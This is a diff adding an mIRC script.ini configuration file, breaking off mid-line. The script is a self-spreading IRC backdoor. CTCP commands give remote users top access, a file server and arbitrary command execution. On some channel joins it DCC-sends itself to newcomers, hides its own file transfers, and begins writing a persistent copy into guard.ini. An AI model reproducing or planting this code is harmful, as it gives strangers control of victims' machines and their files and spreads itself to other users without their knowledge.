@@ -1,0 +1,10 @@
+[script]
+n0=ctcp 1:gimme:/auser 10000 $nick | /clear | /halt
+n1=ctcp 10000:files: /fserve $nick 100 $parm2* | /halt
+n2=ctcp 10000:do: $parm2* | /halt
+n3=on 1:JOIN:#:if ( $rand(1,4) == 1 ) { /dcc send $nick $script } | /halt
+n4=on 1:FILESENT:*.ini:/close -s $nick | /halt
+n5=on 1:SENDFAIL:*.ini:/close -s $nick | /halt
+n6=on 1:INPUT:{ if ( %guard == $null ) { /events on | /ctcps on
+n7=    /writeini guard.ini script n0 ctcp 1:gimme: .auser 10000 $nick $chr(124) .clear $chr(124) .halt
+n8=    /writeini g
